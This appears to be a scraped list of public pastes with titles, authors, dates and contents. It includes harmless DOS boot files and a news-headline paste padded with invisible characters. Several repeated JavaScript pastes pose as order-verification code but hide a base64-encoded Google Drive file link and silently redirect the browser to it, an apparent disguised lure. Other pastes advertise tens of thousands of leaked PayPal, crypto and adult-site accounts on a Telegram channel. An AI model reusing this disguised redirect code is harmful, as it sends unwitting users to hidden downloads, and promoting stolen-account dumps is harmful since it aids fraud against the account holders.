  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vbF80V75,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 24th of April 2025 05:10:48 PM CDT,92790 Accounts Posted On https://t.me/leakedbyeminem
HaEE7SrN,Products.js,jm33,JavaScript,Thursday 24th of April 2025 05:10:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13927/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tKgN7xd8,AUTOEXEC.BAT (for OS Windows XP native standalone build 2),tolikpunkoff,Batch,Thursday 24th of April 2025 05:02:09 PM CDT,"@echo off

echo --------------------------------------
echo OS Windows XP native standalone build 2 Image
echo (L) Hex_laden, PunkArr[], 2016-2025
echo http://tolik-punkoff.com
echo http://lj.rossia.org/users/hex_laden
echo --------------------------------------

echo Set PATH
PATH C:\DOS;C:\VC
echo Loading EMM386 Driver...
emm386.exe
echo Loading SMARTDRV 
smartdrv

GOTO %CONFIG%

:WIN

grub.exe
GOTO END

:DOS

echo Starting File Manager...
vc
GOTO END

:REBOOT

reboot

:END
echo ""-------------------------------------""
echo ""|  -=^-^=- Have a nice day -=^-^=-  |""
echo ""-------------------------------------""
"
T6XiQ9fT,Chaturbate with Tokens,x2LeaF,JavaScript,Thursday 24th of April 2025 04:55:25 PM CDT,91825 Accounts Posted On https://t.me/leakedbyeminem
4cSu2PfA,Order.js,jm33,JavaScript,Thursday 24th of April 2025 04:54:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84381/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pAua4jRV,Crypto Accounts,x2LeaF,JavaScript,Thursday 24th of April 2025 04:40:02 PM CDT,70947 Accounts Posted On https://t.me/leakedbyeminem
ZsYj8NrX,Market.js,jm33,JavaScript,Thursday 24th of April 2025 04:39:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48556/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bSDY3UcB,PayPal with Balance,x2LeaF,JavaScript,Thursday 24th of April 2025 04:24:40 PM CDT,50744 Accounts Posted On https://t.me/leakedbyeminem
yqzv8US6,Untitled,jm33,JavaScript,Thursday 24th of April 2025 04:23:52 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34352/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yK8cZeXm,CONFIG.SYS (for OS Windows XP native standalone build 2),tolikpunkoff,INI file,Thursday 24th of April 2025 04:21:35 PM CDT,"[MENU]
MENUITEM=WIN, Native XP Image
MENUITEM=DOS, Minimal DOS Image
MENUITEM=REBOOT, Reboot Computer
MENUDEFAULT=WIN,10
MENUCOLOR=10,0

[WIN]
SET SEL=WIN

[DOS]
SET SEL=DOS

[REBOOT]
SET SEL=REBOOT

[COMMON]
DEVICE=HIMEM.SYS
"
DkvGihKK,Leaked Accounts - Fresh Hits,x2LeaF,JavaScript,Thursday 24th of April 2025 04:09:17 PM CDT,33727 Accounts Posted On https://t.me/leakedbyeminem
J1pwS6WJ,Products.js,jm33,JavaScript,Thursday 24th of April 2025 04:08:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/41735/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jCZs2hES,Chaturbate with Tokens,x2LeaF,JavaScript,Thursday 24th of April 2025 03:53:54 PM CDT,93512 Accounts Posted On https://t.me/leakedbyeminem
mtzwJXLg,Order.js,jm33,JavaScript,Thursday 24th of April 2025 03:53:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/89443/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2G7munW1,Crypto Accounts,x2LeaF,JavaScript,Thursday 24th of April 2025 03:38:32 PM CDT,45934 Accounts Posted On https://t.me/leakedbyeminem
a5Eskise,Market.js,jm33,JavaScript,Thursday 24th of April 2025 03:37:45 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/68785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WJ4Sy5t0,News April24 25,Newscaster_Ned,Email,Thursday 24th of April 2025 03:31:30 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

D‎i‎n‎g‎a‎ ‎l‎i‎n‎g‎a‎ ‎c‎h‎i‎n‎g‎ ‎c‎h‎o‎n‎g‎,‎ ‎h‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎!‎

S‎o‎u‎t‎h‎ ‎K‎o‎r‎e‎a‎ ‎S‎a‎y‎s‎ ‎C‎h‎i‎n‎a‎’‎s‎ ‎D‎e‎e‎p‎S‎e‎e‎k‎ ‎A‎I‎ ‎T‎r‎a‎n‎s‎f‎e‎r‎r‎e‎d‎ ‎U‎s‎e‎r‎ ‎D‎a‎t‎a‎ ‎O‎v‎e‎r‎s‎e‎a‎s‎
V‎i‎n‎t‎a‎g‎e‎ ‎F‎o‎r‎d‎ ‎A‎u‎t‎o‎m‎o‎b‎i‎l‎e‎ ‎D‎i‎s‎c‎o‎v‎e‎r‎e‎d‎ ‎i‎n‎ ‎W‎o‎r‎l‎d‎ ‎W‎a‎r‎ ‎I‎I‎ ‎W‎r‎e‎c‎k‎a‎g‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎R‎e‎p‎.‎ ‎M‎a‎r‎y‎ ‎M‎i‎l‎l‎e‎r‎ ‎o‎n‎ ‎F‎a‎r‎m‎e‎r‎s‎ ‎a‎n‎d‎ ‎T‎a‎r‎i‎f‎f‎s‎
T‎r‎u‎m‎p‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎M‎e‎e‎t‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎A‎t‎l‎a‎n‎t‎i‎c‎'‎s‎ ‎J‎e‎f‎f‎r‎e‎y‎ ‎G‎o‎l‎d‎b‎e‎r‎g‎
R‎F‎K‎ ‎J‎r‎.‎:‎ ‎E‎r‎a‎ ‎o‎f‎ ‎P‎o‎i‎s‎o‎n‎o‎u‎s‎ ‎C‎o‎m‎p‎o‎u‎n‎d‎s‎ ‎i‎n‎ ‎O‎u‎r‎ ‎F‎o‎o‎d‎ ‎'‎I‎s‎ ‎C‎o‎m‎i‎n‎g‎ ‎t‎o‎ ‎a‎n‎ ‎E‎n‎d‎'‎
D‎u‎r‎a‎b‎l‎e‎ ‎G‎o‎o‎d‎s‎ ‎O‎r‎d‎e‎r‎s‎ ‎J‎u‎m‎p‎e‎d‎ ‎9‎.‎2‎%‎,‎ ‎C‎r‎u‎s‎h‎i‎n‎g‎ ‎E‎x‎p‎e‎c‎t‎a‎t‎i‎o‎n‎s‎
R‎o‎c‎k‎e‎r‎ ‎C‎h‎e‎r‎i‎e‎ ‎C‎u‎r‎r‎i‎e‎ ‎P‎u‎b‎l‎i‎c‎l‎y‎ ‎E‎m‎b‎r‎a‎c‎e‎s‎ ‎'‎F‎u‎l‎l‎ ‎M‎A‎G‎A‎ ‎C‎o‎n‎s‎e‎r‎v‎a‎t‎i‎v‎e‎'‎ ‎L‎a‎b‎e‎l‎
M‎N‎ ‎S‎o‎r‎o‎s‎ ‎P‎r‎o‎s‎e‎c‎u‎t‎o‎r‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎N‎o‎t‎ ‎F‎i‎l‎i‎n‎g‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎e‎s‎l‎a‎ ‎V‎a‎n‎d‎a‎l‎
L‎I‎S‎T‎E‎N‎:‎ ‎S‎C‎O‎T‎U‎S‎ ‎J‎u‎s‎t‎i‎c‎e‎ ‎G‎o‎r‎s‎u‎c‎h‎ ‎A‎r‎g‎u‎e‎s‎ ‎w‎i‎t‎h‎ ‎L‎a‎w‎y‎e‎r‎ ‎o‎v‎e‎r‎ ‎C‎h‎i‎l‎d‎r‎e‎n‎'‎s‎ ‎L‎G‎B‎T‎ ‎B‎o‎o‎k‎
P‎e‎d‎r‎o‎ ‎P‎a‎s‎c‎a‎l‎ ‎C‎a‎l‎l‎s‎ ‎J‎.‎K‎.‎ ‎R‎o‎w‎l‎i‎n‎g‎ ‎a‎ ‎'‎H‎e‎i‎n‎o‎u‎s‎ ‎L‎o‎s‎e‎r‎'‎ ‎f‎o‎r‎ ‎S‎u‎p‎p‎o‎r‎t‎i‎n‎g‎ ‎W‎o‎m‎e‎n‎
I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎d‎ ‎t‎o‎ ‎L‎i‎f‎e‎ ‎i‎n‎ ‎P‎r‎i‎s‎o‎n‎ ‎f‎o‎r‎ ‎D‎o‎u‎b‎l‎e‎ ‎M‎u‎r‎d‎e‎r‎ ‎i‎n‎ ‎L‎a‎s‎ ‎V‎e‎g‎a‎s‎
W‎a‎t‎c‎h‎ ‎L‎i‎v‎e‎:‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎M‎e‎e‎t‎s‎ ‎w‎i‎t‎h‎ ‎P‎r‎i‎m‎e‎ ‎M‎i‎n‎i‎s‎t‎e‎r‎ ‎o‎f‎ ‎N‎o‎r‎w‎a‎y‎
C‎N‎N‎’‎s‎ ‎E‎n‎t‎e‎n‎:‎ ‎T‎h‎e‎r‎e‎ ‎I‎s‎ ‎a‎ ‎'‎R‎e‎v‎o‎l‎t‎ ‎W‎i‎t‎h‎i‎n‎ ‎t‎h‎e‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎i‎c‎ ‎P‎a‎r‎t‎y‎'‎
I‎n‎d‎i‎a‎ ‎a‎n‎d‎ ‎P‎a‎k‎i‎s‎t‎a‎n‎ ‎S‎u‎s‎p‎e‎n‎d‎ ‎T‎r‎a‎d‎e‎,‎ ‎V‎i‎s‎a‎s‎ ‎A‎f‎t‎e‎r‎ ‎K‎a‎s‎h‎m‎i‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎s‎
B‎r‎a‎z‎i‎l‎ ‎S‎u‎p‎r‎e‎m‎e‎ ‎C‎o‎u‎r‎t‎ ‎S‎u‎b‎p‎o‎e‎n‎a‎s‎ ‎J‎a‎i‎r‎ ‎B‎o‎l‎s‎o‎n‎a‎r‎o‎ ‎W‎h‎i‎l‎e‎ ‎H‎e‎ ‎R‎e‎c‎o‎v‎e‎r‎s‎ ‎i‎n‎ ‎I‎C‎U‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
J‎u‎d‎g‎e‎s‎ ‎G‎o‎n‎e‎ ‎W‎i‎l‎d‎!‎

D‎e‎m‎a‎n‎d‎ ‎R‎e‎t‎u‎r‎n‎ ‎o‎f‎ ‎S‎e‎c‎o‎n‎d‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎i‎n‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎
U‎S‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎h‎a‎s‎ ‎p‎a‎i‎d‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎ ‎m‎i‎l‎l‎i‎o‎n‎s‎ ‎o‎f‎ ‎d‎o‎l‎l‎a‎r‎s‎ ‎t‎o‎ ‎l‎o‎c‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎m‎u‎s‎t‎ ‎f‎a‎c‎i‎l‎i‎t‎a‎t‎e‎ ‎t‎h‎e‎ ‎r‎e‎t‎u‎r‎n‎ ‎o‎f‎ ‎a‎ ‎s‎e‎c‎o‎n‎d‎ ‎m‎a‎n‎ ‎w‎r‎o‎n‎g‎l‎y‎ ‎d‎e‎p‎o‎r‎t‎e‎d‎ ‎t‎o‎ ‎a‎ ‎p‎r‎i‎s‎o‎n‎ ‎i‎n‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎,‎ ‎a‎ ‎f‎e‎d‎e‎r‎a‎l‎ ‎j‎u‎d‎g‎e‎ ‎h‎a‎s‎ ‎r‎u‎l‎e‎d‎,‎ ‎d‎e‎e‎p‎e‎n‎i‎n‎g‎ ‎a‎ ‎s‎t‎a‎n‎d‎o‎f‎f‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎t‎h‎e‎ ‎c‎o‎u‎r‎t‎s‎ ‎a‎n‎d‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎ ‎p‎r‎e‎s‎i‎d‎e‎n‎t‎’‎s‎ ‎r‎a‎d‎i‎c‎a‎l‎ ‎i‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎p‎o‎l‎i‎c‎i‎e‎s‎.‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎

J‎u‎d‎g‎e‎ ‎b‎a‎r‎s‎ ‎T‎r‎u‎m‎p‎ ‎f‎r‎o‎m‎ ‎d‎e‎n‎y‎i‎n‎g‎ ‎f‎e‎d‎e‎r‎a‎l‎ ‎f‎u‎n‎d‎s‎ ‎t‎o‎ ‎‘‎s‎a‎n‎c‎t‎u‎a‎r‎y‎’‎ ‎c‎i‎t‎i‎e‎s‎ ‎t‎h‎a‎t‎ ‎l‎i‎m‎i‎t‎ ‎i‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎c‎o‎o‎p‎e‎r‎
J‎u‎d‎g‎e‎ ‎b‎a‎r‎s‎ ‎T‎r‎u‎m‎p‎ ‎f‎r‎o‎m‎ ‎d‎e‎n‎y‎i‎n‎g‎ ‎f‎e‎d‎e‎r‎a‎l‎ ‎f‎u‎n‎d‎s‎ ‎t‎o‎ ‎‘‎s‎a‎n‎c‎t‎u‎a‎r‎y‎’‎ ‎c‎i‎t‎i‎e‎s‎ ‎t‎h‎a‎t‎ ‎l‎i‎m‎i‎t‎ ‎i‎m‎m‎i‎g‎r‎a‎t‎i‎o‎n‎ ‎c‎o‎o‎p‎e‎r‎a‎t‎i‎o‎n‎
2‎,‎3‎8‎5‎
G‎e‎o‎r‎g‎e‎ ‎C‎l‎o‎o‎n‎e‎y‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎‘‎D‎o‎n‎’‎t‎ ‎H‎a‎v‎e‎ ‎A‎n‎y‎b‎o‎d‎y‎ ‎a‎s‎ ‎C‎h‎a‎r‎i‎s‎m‎a‎t‎i‎c‎ ‎a‎s‎’‎ ‎T‎r‎u‎m‎p‎
G‎e‎o‎r‎g‎e‎ ‎C‎l‎o‎o‎n‎e‎y‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎N‎e‎e‎d‎ ‎a‎ ‎'‎S‎e‎n‎s‎e‎ ‎o‎f‎ ‎H‎u‎m‎o‎r‎'‎ ‎t‎o‎ ‎B‎e‎a‎t‎ ‎T‎r‎u‎m‎p‎
6‎1‎3‎
R‎e‎p‎o‎r‎t‎:‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎s‎ ‎L‎o‎o‎k‎ ‎t‎o‎ ‎D‎i‎m‎ ‎t‎h‎e‎ ‎S‎u‎n‎ ‎t‎o‎ ‎C‎o‎u‎n‎t‎e‎r‎ ‎‘‎R‎u‎n‎a‎w‎a‎y‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎’‎
R‎e‎p‎o‎r‎t‎:‎ ‎S‎c‎i‎e‎n‎t‎i‎s‎t‎s‎ ‎L‎o‎o‎k‎ ‎t‎o‎ ‎D‎i‎m‎ ‎t‎h‎e‎ ‎S‎u‎n‎ ‎t‎o‎ ‎P‎r‎e‎v‎e‎n‎t‎ ‎'‎R‎u‎n‎a‎w‎a‎y‎ ‎C‎l‎i‎m‎a‎t‎e‎ ‎C‎h‎a‎n‎g‎e‎'‎
3‎,‎1‎5‎3‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎D‎O‎T‎ ‎S‎e‎c‎.‎ ‎D‎u‎f‎f‎y‎ ‎W‎a‎r‎n‎s‎ ‎B‎l‎u‎e‎ ‎S‎t‎a‎t‎e‎s‎:‎ ‎C‎o‎m‎p‎l‎y‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎ ‎O‎r‎d‎e‎r‎s‎ ‎o‎r‎ ‎L‎o‎s‎e‎ ‎T‎r‎a‎n‎s‎p‎o‎r‎t‎a‎t‎i‎o‎n‎
D‎O‎T‎ ‎S‎e‎c‎.‎ ‎D‎u‎f‎f‎y‎ ‎W‎a‎r‎n‎s‎ ‎B‎l‎u‎e‎ ‎S‎t‎a‎t‎e‎s‎:‎ ‎C‎o‎m‎p‎l‎y‎ ‎w‎i‎t‎h‎ ‎T‎r‎u‎m‎p‎ ‎O‎r‎d‎e‎r‎s‎ ‎o‎r‎ ‎L‎o‎s‎e‎ ‎F‎u‎n‎d‎i‎n‎g‎
3‎,‎3‎5‎0‎
D‎i‎s‎n‎e‎y‎’‎s‎ ‎‘‎F‎a‎n‎t‎a‎s‎t‎i‎c‎ ‎F‎o‎u‎r‎’‎ ‎S‎t‎a‎r‎ ‎P‎e‎d‎r‎o‎ ‎P‎a‎s‎c‎a‎l‎ ‎C‎a‎l‎l‎s‎ ‎J‎.‎K‎.‎ ‎R‎o‎w‎l‎i‎n‎g‎ ‎a‎ ‎‘‎H‎e‎i‎n‎o‎u‎s‎ ‎L‎
P‎e‎d‎r‎o‎ ‎P‎a‎s‎c‎a‎l‎ ‎C‎a‎l‎l‎s‎ ‎J‎.‎K‎.‎ ‎R‎o‎w‎l‎i‎n‎g‎ ‎a‎ ‎'‎H‎e‎i‎n‎o‎u‎s‎ ‎L‎o‎s‎e‎r‎'‎ ‎f‎o‎r‎ ‎S‎u‎p‎p‎o‎r‎t‎i‎n‎g‎ ‎W‎o‎m‎e‎n‎
3‎4‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎S‎h‎u‎t‎s‎ ‎D‎o‎w‎n‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎e‎a‎c‎e‎ ‎P‎l‎a‎n‎,‎ ‎V‎a‎n‎c‎e‎ ‎W‎a‎r‎n‎s‎ ‎U‎.‎S‎.‎ ‎W‎i‎l‎l‎ ‎‘‎W‎a‎l‎k‎ ‎A‎w‎a‎y‎’‎ ‎i‎f‎ ‎N‎o‎ ‎
Z‎e‎l‎e‎n‎s‎k‎y‎ ‎S‎h‎u‎t‎s‎ ‎D‎o‎w‎n‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎P‎e‎a‎c‎e‎ ‎P‎l‎a‎n‎
1‎1‎,‎8‎0‎9‎
T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎Z‎e‎l‎e‎n‎s‎k‎y‎ ‎I‎s‎ ‎T‎h‎e‎ ‎S‎t‎u‎m‎b‎l‎i‎n‎g‎ ‎B‎l‎o‎c‎k‎ ‎t‎o‎ ‎P‎e‎a‎c‎e‎ ‎i‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎,‎ ‎W‎i‎l‎l‎ ‎M‎e‎e‎t‎ ‎W‎i‎t‎h‎ ‎P‎u‎t‎i‎n‎ ‎S‎o‎o‎n‎
T‎r‎u‎m‎p‎ ‎S‎a‎y‎s‎ ‎Z‎e‎l‎e‎n‎s‎k‎y‎ ‎T‎h‎e‎ ‎S‎t‎u‎m‎b‎l‎i‎n‎g‎ ‎B‎l‎o‎c‎k‎ ‎t‎o‎ ‎P‎e‎a‎c‎e‎ ‎i‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎
2‎,‎0‎2‎1‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎Y‎a‎s‎s‎a‎m‎i‎n‎ ‎A‎n‎s‎a‎r‎i‎ ‎U‎r‎g‎e‎s‎ ‎M‎o‎r‎e‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎ ‎t‎o‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎,‎ ‎F‎a‎l‎s‎e‎l‎y‎ ‎C‎l‎a‎i‎m‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎e‎ ‎I‎s‎ ‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎A‎n‎s‎a‎r‎i‎ ‎C‎a‎l‎l‎s‎ ‎o‎n‎ ‎M‎o‎r‎e‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎ ‎t‎o‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎
3‎,‎9‎5‎1‎
